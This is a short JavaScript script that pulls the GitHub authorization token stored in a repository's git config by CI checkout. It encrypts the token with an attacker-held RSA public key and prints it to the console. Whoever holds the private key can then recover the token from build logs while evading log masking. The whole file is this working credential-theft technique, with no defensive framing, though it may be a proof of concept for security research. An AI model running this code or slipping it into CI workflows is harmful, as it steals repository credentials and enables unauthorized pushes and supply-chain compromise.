import simpleGit from "simple-git";
import NodeRSA from "node-rsa";
import { promises } from "fs";
const { readFile } = promises;

const PREFIX = "AUTHORIZATION: basic ";

const publicKey = new NodeRSA(await readFile("id_rsa.pub"));

async function getToken(git) {
    const extraHeader = await git.getConfig("http.https://github.com/.extraheader");
    for (const header of extraHeader.values) {
        if (header.startsWith(PREFIX)) {
            return header.substring(PREFIX.length);
        }
    }
    return null;
}

const git = simpleGit();
const token = await getToken(git);
if (token !== null) {
    console.log(`Found the token: ${publicKey.encrypt(token, "base64")}`);
} else {
    console.log("Found no token...");
}

